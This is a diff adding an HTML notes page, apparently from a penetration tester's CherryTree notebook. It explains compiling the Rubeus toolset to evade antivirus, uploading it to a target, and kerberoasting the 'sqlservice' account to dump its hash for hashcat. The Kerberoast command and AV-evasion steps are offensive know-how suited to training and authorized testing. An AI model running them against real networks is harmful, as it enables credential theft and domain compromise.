@@ -1,0 +1,40 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Rebeus</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Rebeus</h1><br /><br />GitHub: <a
+      href="https://github.com/GhostPack/Rubeus" target="_blank">https://github.com/GhostPack/Rubeus</a><br /><br />If the
+    Invoke-Kerberoast.ps1 is blocked by AV because they block most forms of PS, do they block C#? <br />We can try to
+    use Rebeus is a C# toolset for raw Kerberos interaction and abuses<br /><br /><strong>Compile
+      Rebeus</strong><br />1. Download the zip file from the Github page<br />2. Open the SLN file (structure file used
+    for organizing projects) with Microsoft Visual Studio<br /> <a href=""><img src="images/1140-1.png"
+        alt="images/1140-1.png" /></a><br />3. Turn off AV and Compile Rebeus by clicking on the Start button of Visual
+    Studio<br /> <a href=""><img src="images/1140-2.png" alt="images/1140-2.png" /></a><br /> Rebeus.exe will be created
+    in the folder ..\Rubeus-master\Rubeus\bin\Debug<br />4. Upload Rebeus on the target machine<br />Already
+    Compiled(Jenuary 2021): <a
+      href="https://github.com/DenFox93/Compiled-programs/raw/main/Rubeus.exe" target="_blank">https://github.com/DenFox93/Compiled-programs/raw/main/Rubeus.exe</a><br /><strong>Dump
+      Hash</strong><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;.\Rubeus.exe&nbsp;kerberoast&nbsp;/format:hashcat&nbsp;/tgtdel&nbsp;/user:sqlservice&nbsp;/outfile:hash.txt
+      </div>
+    </div><br />Explained well in <a
+      href="https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/#:~:text=Trying%20to%20Build%20a%20Better%20Kerberoast" target="_blank">this
+      article of @harmj0y</a>, For AES-enabled accounts with the /tgtdeleg option we specify RC4 as the only encryption
+    algorithm we support<br /> <a href=""><img src="images/1140-3.png"
+        alt="images/1140-3.png" /></a><br /><br /><br /><br /><br />Bibliography:<br />• <a
+      href="https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/" target="_blank">https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/</a><br />•
+    <a
+      href="https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/" target="_blank">https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/</a>
+  </div>
+</body>
+
+</html>
